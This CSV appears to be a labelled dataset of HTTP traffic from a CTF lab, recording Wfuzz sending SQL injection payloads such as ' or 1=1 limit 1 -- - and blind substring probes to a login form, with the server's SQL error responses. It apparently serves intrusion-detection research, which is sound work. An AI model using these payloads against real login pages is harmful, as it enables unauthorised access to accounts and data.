attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Connection,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
sql,192.168.1.39,80,,"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",keep-alive,,,192.168.1.39,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,GET,http://192.168.1.39/vuln/web/chall2/index.php,"TRY to connect as 'admin' user <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",Keep-Alive,222,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:02 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56374
sql,192.168.1.39,80,username=' or 1=1 limit 1 -- -+&password=admin123&submit=submit,*/*,,63,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S22]: Column not found: 1054 Unknown column 'flag' in 'field list' in /var/www/html/vuln/web/chall2/index.php:23 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(23): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(49): getFlag() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>23</b><br /> ,,414,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56384
sql,192.168.1.39,80,"username='=""or'&password=admin123&submit=submit",*/*,,47,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;or'' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,578,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56385
sql,192.168.1.39,80,"username=admin' and substring(password/text(),1,1)='7&password=admin123&submit=submit",*/*,,85,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(),1,1)='7' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,579,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56376
sql,192.168.1.39,80,"username="" or ""1""=""1""--&password=admin123&submit=submit",*/*,,55,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56377
sql,192.168.1.39,80,"username="" or ""1""=""1""#&password=admin123&submit=submit",*/*,,54,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56378
sql,192.168.1.39,80,"username="" or ""1""=""1&password=admin123&submit=submit",*/*,,52,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56379
sql,192.168.1.39,80,username=') or ('1'='1'#&password=admin123&submit=submit,*/*,,56,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') or ('1'='1'#' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,583,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56380
sql,192.168.1.39,80,username='or'1=1���&password=admin123&submit=submit,*/*,,51,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56381
sql,192.168.1.39,80,"username=' and substring(password/text(),1,1)='7&password=admin123&submit=submit",*/*,,80,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '(),1,1)='7' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ",,579,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:28:06 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56382
